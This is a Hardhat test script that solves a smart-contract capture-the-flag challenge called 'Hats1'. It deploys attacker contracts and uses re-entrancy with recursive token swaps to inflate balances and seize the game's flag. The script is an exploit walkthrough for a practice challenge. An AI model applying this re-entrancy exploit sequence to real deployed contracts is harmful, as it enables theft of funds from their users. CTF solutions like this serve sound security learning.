import { expect } from "chai";
import { ethers } from "hardhat";
import {
  Alice__factory,
  Bob__factory,
  Game__factory,
  OtherBob__factory,
} from "../typechain";

const GAME_ADDRESS = "0x9E4c331120448816450615349BD25605e4A2049E";

describe("CTF Hats1", () => {
  it("should win", async () => {
    const [deployer] = await ethers.getSigners();
    const game = await new Game__factory(deployer).attach(GAME_ADDRESS);

    // Deploy attacking contract
    const bob1 = await new Bob__factory(deployer).deploy(
      deployer.address,
      GAME_ADDRESS
    );
    const alice1 = await new Alice__factory(deployer).deploy(
      deployer.address,
      GAME_ADDRESS
    );
    await bob1.setAlice(alice1.address);
    await alice1.setBob(bob1.address);
    const bob2 = await new OtherBob__factory(deployer).deploy(
      deployer.address,
      GAME_ADDRESS
    );
    const alice2 = await new Alice__factory(deployer).deploy(
      deployer.address,
      GAME_ADDRESS
    );
    await bob2.setAlice(alice2.address);
    await alice2.setBob(bob2.address);

    // Capture the flag starting with Alice
    // Phase 1: Alice re-enters Bob and recursively swaps until Bob has a balance of 6 tokens
    await alice1.begin();
    await alice2.begin();

    // End of phase 1: Both Bobs have a balance of 6
    expect(await game.balanceOf(bob1.address)).to.equal(6);
    expect(await game.balanceOf(bob2.address)).to.equal(6);

    // Phase 2: Now we give Bob #1 all the tokens from Bob #2
    await bob1.setOtherBob(bob2.address);
    await bob2.setOtherBob(bob1.address);

    await bob2.beginSwapSelf(bob1.address);
    // End of phase 2: Bob #1 has 9 tokens! (Now Bob #1 is invincible)
    expect(await game.balanceOf(bob1.address)).to.equal(9);

    // We own the flag
    await bob1.fight();
    expect(await game.flagHolder()).to.equal(bob1.address);
  });
});
